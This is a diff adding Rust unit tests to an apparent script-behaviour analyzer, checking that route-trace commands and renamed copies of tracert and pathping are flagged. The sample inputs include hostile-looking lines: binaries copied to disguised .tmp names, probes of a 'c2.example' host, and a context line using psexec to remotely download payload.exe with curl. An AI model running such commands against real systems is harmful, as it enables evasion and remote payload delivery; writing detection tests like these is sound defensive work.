@@ -3818,6 +3818,61 @@ C:\Users\Public\nv.tmp view \\target.example
     }
 
     #[test]
+    fn route_trace_commands_emit_network_probe_traits() {
+        let report = analyze(
+            br#"tracert -d c2.example
+pathping -n 203.0.113.10
+"#,
+            &AnalyzeConfig::default(),
+        );
+
+        for target in ["c2.example", "203.0.113.10"] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::NetworkProbe { probe_kind, target: t }
+                        if probe_kind == "route-trace" && t == target
+                )),
+                "missing route-trace target {target}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
+    fn copied_route_trace_aliases_emit_network_probe_traits() {
+        let script = br#"copy C:\Windows\System32\tracert.exe C:\Users\Public\tr.tmp
+C:\Users\Public\tr.tmp -d c2.example
+copy C:\Windows\System32\pathping.exe C:\Users\Public\pp.tmp
+C:\Users\Public\pp.tmp -n 203.0.113.10
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        for target in [r#"C:\Users\Public\tr.tmp"#, r#"C:\Users\Public\pp.tmp"#] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::ManipulatedExec { target: t, .. }
+                        if t.eq_ignore_ascii_case(target)
+                )),
+                "copied route-trace alias {target} was not surfaced: {:?}",
+                report.traits
+            );
+        }
+        for target in ["c2.example", "203.0.113.10"] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::NetworkProbe { probe_kind, target: t }
+                        if probe_kind == "route-trace" && t == target
+                )),
+                "missing copied route-trace target {target}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
     fn psexec_replays_remote_cmd_child() {
         let script = br#"psexec \\target.example -u admin -p pass cmd.exe /V:ON /c set U=https://psexec-wrapper.example/payload.exe&&curl -o payload.exe !U!"#;
         let report = analyze(script, &AnalyzeConfig::default());
